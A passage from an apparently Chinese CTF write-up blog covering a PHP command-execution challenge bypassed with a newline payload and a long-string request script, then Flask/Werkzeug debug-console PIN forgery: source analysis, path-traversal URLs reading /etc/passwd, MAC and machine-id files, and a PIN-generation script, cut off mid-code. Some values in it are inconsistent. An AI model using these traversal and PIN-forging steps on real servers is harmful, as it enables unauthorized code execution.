    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cmd</span> <span class="token operator">!==</span> <span class="token keyword">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
      <span class="token keyword">echo</span> <span class="token string">'Invalid input'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">echo</span> <span class="token string">'&lt;br/>&lt;br/>'</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token delimiter">?></span></code></pre>
<p>preg_match()函数只能匹配第一行数据，可以使用换行符%0a绕过</p>
<pre><code>{%0A"cmd":"/bin/cat /home/rceservice/flag"%0A}</code></pre>
<p>或者</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests

payload <span class="token operator">=</span> <span class="token string">'{"cmd":"/bin/cat /home/rceservice/flag","test":"'</span> <span class="token operator">+</span> <span class="token string">"a"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">1000000</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'"}'</span>
res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://ad66432f-4628-41f6-8190-d9b9c247904c.node3.buuoj.cn/"</span><span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"cmd"</span><span class="token punctuation">:</span>payload<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#print(payload)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre>
]]></content>
      <tags>
        <tag>json</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask debug PIN命令执行漏洞/CISCN2018：final-TimeKeeper/GYCTF2020：FlaskApp</title>
    <url>/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/</url>
    <content><![CDATA[<h1 id="Flask-debug-PIN命令执行漏洞"><a href="#Flask-debug-PIN命令执行漏洞" class="headerlink" title="Flask debug PIN命令执行漏洞"></a>Flask debug PIN命令执行漏洞</h1><p>在同一台机器上，多次重启Flask服务，PIN码值不改变，即PIN值固定。</p>
<p>Flask在生产环境中开启debug模式是一件非常危险的事，主要有3点原因：</p>
<p>1、会泄露当前报错页面的源码，可供审计挖掘其他漏洞</p>
<p>2、会泄露Web应用的绝对路径，及Python解释器的路径</p>
<p>3、debug页面中包含Python的交互式shell，可以执行任意Python代码</p>
<h2 id="代码分析："><a href="#代码分析：" class="headerlink" title="代码分析："></a>代码分析：</h2><pre><code>python39\Lib\site-packages\flask\aap.py
python39\Lib\site-packages\werkzeug\serving.py
python39\Lib\site-packages\werkzeug\debug\__init__.py</code></pre>
<p><code>debug\__init__.py</code>,<code>_get_pin</code>函数</p>
<pre class=" language-python"><code class="language-python">    <span class="token keyword">def</span> <span class="token function">pin</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>str<span class="token punctuation">]</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token operator">not</span> hasattr<span class="token punctuation">(</span>self<span class="token punctuation">,</span> <span class="token string">"_pin"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#hasattr() 函数用于判断对象是否包含对应的属性</span>
            pin_cookie <span class="token operator">=</span> get_pin_and_cookie_name<span class="token punctuation">(</span>self<span class="token punctuation">.</span>app<span class="token punctuation">)</span>
            self<span class="token punctuation">.</span>_pin<span class="token punctuation">,</span> self<span class="token punctuation">.</span>_pin_cookie <span class="token operator">=</span> pin_cookie  <span class="token comment" spellcheck="true"># type: ignore</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>_pin</code></pre>
<p>跟进<code>get_pin_and_cookie_name</code>：</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_pin_and_cookie_name</span><span class="token punctuation">(</span>
    app<span class="token punctuation">:</span> <span class="token string">"WSGIApplication"</span><span class="token punctuation">,</span>
<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span>str<span class="token punctuation">,</span> str<span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span>None<span class="token punctuation">,</span> None<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""Given an application object this returns a semi-stable 9 digit pin
    code and a random key.  The hope is that this is stable between
    restarts to not make debugging particularly frustrating.  If the pin
    was forcefully disabled this returns `None`.

    Second item in the resulting tuple is the cookie name for remembering.
    """</span>
    pin <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"WERKZEUG_DEBUG_PIN"</span><span class="token punctuation">)</span>
    rv <span class="token operator">=</span> None
    num <span class="token operator">=</span> None

    <span class="token comment" spellcheck="true"># Pin was explicitly disabled</span>
    <span class="token keyword">if</span> pin <span class="token operator">==</span> <span class="token string">"off"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> None<span class="token punctuation">,</span> None

    <span class="token comment" spellcheck="true"># Pin was provided explicitly</span>
    <span class="token keyword">if</span> pin <span class="token keyword">is</span> <span class="token operator">not</span> None <span class="token operator">and</span> pin<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true"># If there are separators in the pin, return it directly</span>
        <span class="token keyword">if</span> <span class="token string">"-"</span> <span class="token keyword">in</span> pin<span class="token punctuation">:</span>
            rv <span class="token operator">=</span> pin
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            num <span class="token operator">=</span> pin

    modname <span class="token operator">=</span> getattr<span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__module__"</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>cast<span class="token punctuation">(</span>object<span class="token punctuation">,</span> app<span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__module__<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#getattr() 函数用于返回一个对象属性值</span>
    username<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span>str<span class="token punctuation">]</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true"># getuser imports the pwd module, which does not exist in Google</span>
        <span class="token comment" spellcheck="true"># App Engine. It may also raise a KeyError if the UID does not</span>
        <span class="token comment" spellcheck="true"># have a username, such as in Docker.</span>
        username <span class="token operator">=</span> getpass<span class="token punctuation">.</span>getuser<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> <span class="token punctuation">(</span>ImportError<span class="token punctuation">,</span> KeyError<span class="token punctuation">)</span><span class="token punctuation">:</span>
        username <span class="token operator">=</span> None

    mod <span class="token operator">=</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>get<span class="token punctuation">(</span>modname<span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true"># This information only exists to make the cookie unique on the</span>
    <span class="token comment" spellcheck="true"># computer, not as a security feature.</span>
    probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
        username<span class="token punctuation">,</span>
        modname<span class="token punctuation">,</span>
        getattr<span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">,</span> type<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">.</span>__name__<span class="token punctuation">)</span><span class="token punctuation">,</span>
        getattr<span class="token punctuation">(</span>mod<span class="token punctuation">,</span> <span class="token string">"__file__"</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span>

    <span class="token comment" spellcheck="true"># This information is here to make it harder for an attacker to</span>
    <span class="token comment" spellcheck="true"># guess the cookie name.  They are unlikely to be contained anywhere</span>
    <span class="token comment" spellcheck="true"># within the unauthenticated debug page.</span>
    private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>str<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> get_machine_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

    h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha1<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token operator">not</span> bit<span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>bit<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">:</span>
            bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>
        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>b<span class="token string">"cookiesalt"</span><span class="token punctuation">)</span>

    cookie_name <span class="token operator">=</span> f<span class="token string">"__wzd{h.hexdigest()[:20]}"</span>

    <span class="token comment" spellcheck="true"># If we need to generate a pin we salt it a bit more so that we don't</span>
    <span class="token comment" spellcheck="true"># end up with the same value and generate out 9 digits</span>
    <span class="token keyword">if</span> num <span class="token keyword">is</span> None<span class="token punctuation">:</span>
        h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>b<span class="token string">"pinsalt"</span><span class="token punctuation">)</span>
        num <span class="token operator">=</span> f<span class="token string">"{int(h.hexdigest(), 16):09d}"</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>

    <span class="token comment" spellcheck="true"># Format the pincode in groups of digits for easier remembering if</span>
    <span class="token comment" spellcheck="true"># we don't have a result yet.</span>
    <span class="token keyword">if</span> rv <span class="token keyword">is</span> None<span class="token punctuation">:</span>
        <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> len<span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
                rv <span class="token operator">=</span> <span class="token string">"-"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>
                    num<span class="token punctuation">[</span>x <span class="token punctuation">:</span> x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">"0"</span><span class="token punctuation">)</span>
                    <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span>
                <span class="token punctuation">)</span>
                <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            rv <span class="token operator">=</span> num

    <span class="token keyword">return</span> rv<span class="token punctuation">,</span> cookie_name</code></pre>
<p>rv即PIN</p>
<p>主要代码为哈希：</p>
<pre class=" language-Python"><code class="language-Python">for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, text_type):
        bit = bit.encode('utf-8')
    h.update(bit)
h.update(b'cookiesalt')</code></pre>
<p>其中的两个列表：</p>
<pre class=" language-python"><code class="language-python">probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    username<span class="token punctuation">,</span><span class="token comment" spellcheck="true">#root当前用户，通过读取/etc/passwd获取</span>
    modname<span class="token punctuation">,</span><span class="token comment" spellcheck="true">#flask.app一般情况为固定值</span>
    getattr<span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">'__name__'</span><span class="token punctuation">,</span> getattr<span class="token punctuation">(</span>app<span class="token punctuation">.</span>__class__<span class="token punctuation">,</span> <span class="token string">'__name__'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#Flask一般情况为固定值</span>
    getattr<span class="token punctuation">(</span>mod<span class="token punctuation">,</span> <span class="token string">'__file__'</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">##flask目录下的一个app.py的绝对路径，通过debug错误页面获取</span>
<span class="token punctuation">]</span>

private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    str<span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#mac地址的十进制，通过读取/sys/class/net/eth0/address获取mac地址 如果不是映射端口 可以通过arp ip命令获取</span>
    get_machine_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#机器名，通过读取/proc/self/cgroup或/proc/sys/kernel/random/boot_id 或/etc/machine-id获取</span>
<span class="token punctuation">]</span></code></pre>
<p>get_machine_id()</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">_generate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true"># Potential sources of secret information on linux.  The machine-id</span>
        <span class="token comment" spellcheck="true"># is stable across boots, the boot id is not</span>
        <span class="token keyword">for</span> filename <span class="token keyword">in</span> <span class="token string">'/etc/machine-id'</span><span class="token punctuation">,</span> <span class="token string">'/proc/sys/kernel/random/boot_id'</span><span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">with</span> open<span class="token punctuation">(</span>filename<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                    <span class="token keyword">return</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">except</span> IOError<span class="token punctuation">:</span>
                <span class="token keyword">continue</span>

        <span class="token comment" spellcheck="true"># On OS X we can use the computer's serial number assuming that</span>
        <span class="token comment" spellcheck="true"># ioreg exists and can spit out that information.</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token comment" spellcheck="true"># Also catch import errors: subprocess may not be available, e.g.</span>
            <span class="token comment" spellcheck="true"># Google App Engine</span>
            <span class="token comment" spellcheck="true"># See https://github.com/pallets/werkzeug/issues/925</span>
            <span class="token keyword">from</span> subprocess <span class="token keyword">import</span> Popen<span class="token punctuation">,</span> PIPE
            dump <span class="token operator">=</span> Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ioreg'</span><span class="token punctuation">,</span> <span class="token string">'-c'</span><span class="token punctuation">,</span> <span class="token string">'IOPlatformExpertDevice'</span><span class="token punctuation">,</span> <span class="token string">'-d'</span><span class="token punctuation">,</span> <span class="token string">'2'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
                         stdout<span class="token operator">=</span>PIPE<span class="token punctuation">)</span><span class="token punctuation">.</span>communicate<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
            match <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>b<span class="token string">'"serial-number" = &lt;([^>]+)'</span><span class="token punctuation">,</span> dump<span class="token punctuation">)</span>
            <span class="token keyword">if</span> match <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>
                <span class="token keyword">return</span> match<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> <span class="token punctuation">(</span>OSError<span class="token punctuation">,</span> ImportError<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>

        <span class="token comment" spellcheck="true"># On Windows we can use winreg to get the machine guid</span>
        wr <span class="token operator">=</span> None
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            <span class="token keyword">import</span> winreg <span class="token keyword">as</span> wr
        <span class="token keyword">except</span> ImportError<span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">import</span> _winreg <span class="token keyword">as</span> wr
            <span class="token keyword">except</span> ImportError<span class="token punctuation">:</span>
                <span class="token keyword">pass</span>
        <span class="token keyword">if</span> wr <span class="token keyword">is</span> <span class="token operator">not</span> None<span class="token punctuation">:</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                <span class="token keyword">with</span> wr<span class="token punctuation">.</span>OpenKey<span class="token punctuation">(</span>wr<span class="token punctuation">.</span>HKEY_LOCAL_MACHINE<span class="token punctuation">,</span>
                                <span class="token string">'SOFTWARE\\Microsoft\\Cryptography'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>
                                wr<span class="token punctuation">.</span>KEY_READ <span class="token operator">|</span> wr<span class="token punctuation">.</span>KEY_WOW64_64KEY<span class="token punctuation">)</span> <span class="token keyword">as</span> rk<span class="token punctuation">:</span>
                    machineGuid<span class="token punctuation">,</span> wrType <span class="token operator">=</span> wr<span class="token punctuation">.</span>QueryValueEx<span class="token punctuation">(</span>rk<span class="token punctuation">,</span> <span class="token string">'MachineGuid'</span><span class="token punctuation">)</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>wrType <span class="token operator">==</span> wr<span class="token punctuation">.</span>REG_SZ<span class="token punctuation">)</span><span class="token punctuation">:</span>
                        <span class="token keyword">return</span> machineGuid<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
                    <span class="token keyword">else</span><span class="token punctuation">:</span>
                        <span class="token keyword">return</span> machineGuid
            <span class="token keyword">except</span> WindowsError<span class="token punctuation">:</span>
                <span class="token keyword">pass</span>

    _machine_id <span class="token operator">=</span> rv <span class="token operator">=</span> _generate<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> rv</code></pre>
<p>首先尝试读取<code>/etc/machine-id</code>或者 <code>/proc/sys/kernel/random/boot_i</code>中的值，若有就直接返回</p>
<p>假如是在win平台下读取不到上面两个文件，就去获取注册表中<code>SOFTWARE\\Microsoft\\Cryptography</code>的值，并返回</p>
<p>脚本见：“CISCN2018：final-TimeKeeper”</p>
<h2 id="测试环境："><a href="#测试环境：" class="headerlink" title="测试环境："></a>测试环境：</h2><ul>
<li>Windows 11</li>
<li>Python  3.9.6</li>
<li>Flask 2.0.1</li>
</ul>
<h2 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h2><ol>
<li><p>下载flask：（我使用pycharm）</p>
</li>
<li><p>基于flask的web应用1.py</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> Hello

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>
<p>“return Hello”存在错误这里的hello未被定义，“debug=True”开启调试模式</p>
</li>
<li><p>部署到环境中</p>
<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111145529828.png" alt="image-20211111145529828"></p>
<p>由于代码存在错误会进入debug</p>
<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111145659650.png" alt="image-20211111145659650"></p>
<p>可以看到解释器和应用路径</p>
<p>console中输入pin</p>
<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111150227938.png" alt="image-20211111150227938"></p>
<p>都未执行成功</p>
<p>后面的没能完成采用文章截图吧</p>
<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111150209244.png" alt="image-20211111150209244"></p>
</li>
</ol>
<h2 id="后记："><a href="#后记：" class="headerlink" title="后记："></a>后记：</h2><p>在kali中跑出来了</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> subprocess <span class="token keyword">import</span> check_output

check_output<span class="token punctuation">(</span><span class="token string">'ifconfig'</span><span class="token punctuation">,</span>shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span></code></pre>
<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111174707599.png" alt="image-20211111174707599"></p>
<h1 id="CISCN2018：final-TimeKeeper"><a href="#CISCN2018：final-TimeKeeper" class="headerlink" title="CISCN2018：final-TimeKeeper"></a>CISCN2018：final-TimeKeeper</h1><p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111124738927.png" alt="image-20211111124738927"></p>
<p>发现/console</p>
<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111124829534.png" alt="image-20211111124829534"></p>
<p>输错价格和id进入python debug</p>
<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111125158901.png" alt="image-20211111125158901"></p>
<p>获取flask目录下的一个app.py的绝对路径</p>
<pre><code>/usr/local/lib/python2.7/dist-packages/flask/app.py</code></pre>
<pre><code>http://111.200.241.244:49355/asserts/..%2f..%2f..%2f..%2f/etc/passwd</code></pre>
<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111130049191.png" alt="image-20211111130049191"></p>
<p>root和ctf可用</p>
<pre><code>http://111.200.241.244:49355/asserts/..%2f..%2f..%2f..%2f/sys/class/net/eth0/address</code></pre>
<p>02:d9:d4:24:40:16</p>
<p>转换为十进制</p>
<p>3134590304278</p>
<pre><code>http://111.200.241.244:49355/asserts/..%2f..%2f..%2f..%2f/proc/self/cgroup</code></pre>
<p><img src="/2021/11/11/flask-debug-pin-ming-ling-zhi-xing-lou-dong-ciscn2018-final-timekeeper-gyctf2020-flaskapp/image-20211111130245290.png" alt="image-20211111130245290"></p>
<pre><code>9c53f2ee41ea353b18b583926197cd776487bfab3058a8f319734dc65e71d302</code></pre>
<pre><code>http://111.200.241.244:49355/asserts/..%2f..%2f..%2f..%2f/proc/sys/kernel/random/boot_id</code></pre>
<pre><code>012c0db1-a401-4a82-b781-03d7681c398e</code></pre>
<p>信息：</p>
<pre class=" language-python"><code class="language-python">list <span class="token operator">=</span> <span class="token punctuation">[</span> <span class="token string">'root'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#当前用户，通过读取/etc/passwd获取 </span>
        <span class="token string">'flask.app'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">#一般情况为固定值     </span>
        <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#一般情况为固定值 </span>
         <span class="token string">'/usr/local/lib/python2.7/dist-packages/flask/app.py'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#flask目录下的一个app.py的绝对路径，通过debug错误页面获取 </span>
         <span class="token string">'2583524700623'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">#mac地址的十进制，通过读取/sys/class/net/eth0/address获取mac地址 如果不是映射端口 可以通过arp ip命令获取 </span>
         <span class="token string">'19ef9f241e480f2bca3437d27505a657eda03c05014023382e1b00667d4c82ad'</span><span class="token comment" spellcheck="true">#机器名，通过读取/proc/self/cgroup或/proc/sys/kernel/random/boot_id 或/etc/machine-id获取 ]</span>
</code></pre>
<p>生成PIN：</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlib
<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'root'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true"># username</span>
    <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true"># modname</span>
    <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span>
    <span class="token string">'/usr/local/lib/python2.7/dist-packages/flask/app.py'</span> <span class="token comment" spellcheck="true"># getattr(mod, '__file__', None),</span>
<span class="token punctuation">]</span>

private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">'3134590304278'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true"># str(uuid.getnode()),  /sys/class/net/ens33/address</span>
    <span class="token string">'9c53f2ee41ea353b18b583926197cd776487bfab3058a8f319734dc65e71d302'</span><span class="token comment" spellcheck="true"># , /proc/self/cgroup</span>
<span class="token punctuation">]</span>

h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token operator">not</span> bit<span class="token punctuation">:</span>
        <span class="token keyword">continue</span>
    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>bit<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">:</span>
        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>b<span class="token string">'cookiesalt'</span><span class="token punctuation">)</span>

cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>

num <span class="token operator">=</span> None
<span class="token keyword">if</span> num <span class="token keyword">is</span> None<span class="token punctuation">:</span>
    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>b<span class="token string">'pinsalt'</span><span class="token punctuation">)</span>
    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> int<span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>

rv <span class="token operator">=</span>None
<span class="token keyword">if</span> rv <span class="token keyword">is</span> None<span class="token punctuation">:</span>
    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> len<span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
